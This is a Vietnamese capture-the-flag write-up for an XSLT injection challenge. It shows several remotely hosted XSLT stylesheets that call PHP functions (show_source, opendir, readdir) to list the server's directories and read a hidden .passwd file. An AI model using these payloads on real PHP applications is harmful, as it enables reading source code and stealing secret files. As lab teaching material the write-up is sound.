Bắt request với Burp Suite, có 1 tham số được gửi kèm là

> xsl= style1.xsl

Vậy có thể liên tưởng đến LFI hoặc RFI, nhưng mình nghiêng về RFI hơn vì đề bài có hint Code Excution

<b>Kiến thức cần biết: </b>Trong XSLT có thẻ `value-of`cho phép thực thi câu lệnh PHP, chỉ cần thêm cặp giá trị `xmlns:php="http://php.net/xsl` vào thẻ xml 

Vào pastebin thử 1 đoạn code đơn giản:

```xml
<?xml version="1.0" encoding="UTF-8"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<xsl:template match="/">
<xsl:value-of select="php:function('show_source','index.php')"/>
</xsl:template>
</xsl:stylesheet>
```

Không ra gì cả, vậy nghĩ đến phương án dùng `scandir` để xem có những file nào trong folder hiện tại:

```xml
<?xml version="1.0" encoding="UTF-8"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<xsl:template match="/">
<xsl:value-of select="php:function('scandir','./')"/>
</xsl:template>
</xsl:stylesheet>
```

nó chỉ trả về mỗi `Array`, hmmm

<b>Kiến thức cần biết:</b>Thay vì dùng `scandir`, có thể dùng cặp `opendir`,`readdir`, dựa theo [link](https://security.stackexchange.com/questions/170712/execute-a-php-function-that-returns-an-array-from-an-xsl-file), có vẻ như người hỏi cũng đang làm chall xslt này

```xml
<?xml version="1.0" encoding="UTF-8"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<xsl:template match="/">
<xsl:value-of select="php:function('opendir','./')"/>
<xsl:value-of select="php:function('readdir')"/>
<xsl:value-of select="php:function('readdir')"/>
<xsl:value-of select="php:function('readdir')"/>
<xsl:value-of select="php:function('readdir')"/>
<xsl:value-of select="php:function('readdir')"/>
<xsl:value-of select="php:function('readdir')"/>
<xsl:value-of select="php:function('readdir')"/>
<xsl:value-of select="php:function('readdir')"/>
<xsl:value-of select="php:function('readdir')"/>
<xsl:value-of select="php:function('readdir')"/>
<xsl:value-of select="php:function('readdir')"/>
<xsl:value-of select="php:function('readdir')"/>
<xsl:value-of select="php:function('readdir')"/>
<xsl:value-of select="php:function('readdir')"/>
<xsl:value-of select="php:function('readdir')"/>
<xsl:value-of select="php:function('readdir')"/>
<xsl:value-of select="php:function('readdir')"/>

</xsl:template>
</xsl:stylesheet>
```

Ở đây dùng nhiều `readdir` vì nó không in ra 1 lúc hết tất cả mọi thứ trong folder, nếu hết nó sẽ in ra false. Kết quả:

> Resource id #6..beers.xml._nginx.http-level.incstyle1.xsl._nginx.server-level.incstyle2.xsl._firewall.style3.xslindex.php._php-fpm.pool.inc.6ff3200bee785801f420fba826ffcdeefalsefalsefalsefalsefalse

Thư mục cuối nhìn khả nghi nhất:

```xml
<?xml version="1.0" encoding="UTF-8"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<xsl:template match="/">
<xsl:value-of select="php:function('opendir','.6ff3200bee785801f420fba826ffcdee')"/>
<xsl:value-of select="php:function('readdir')"/>
<xsl:value-of select="php:function('readdir')"/>
<xsl:value-of select="php:function('readdir')"/>
<xsl:value-of select="php:function('readdir')"/>

</xsl:template>
</xsl:stylesheet>
```

trả về:

> Resource id #6...passwd

Ok vậy đọc file passwd là ra flag:

```xml
<?xml version="1.0" encoding="UTF-8"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<xsl:template match="/">
<xsl:value-of select="php:function('show_source','.6ff3200bee785801f420fba826ffcdee/.passwd')"/>

</xsl:template>
</xsl:stylesheet>
```

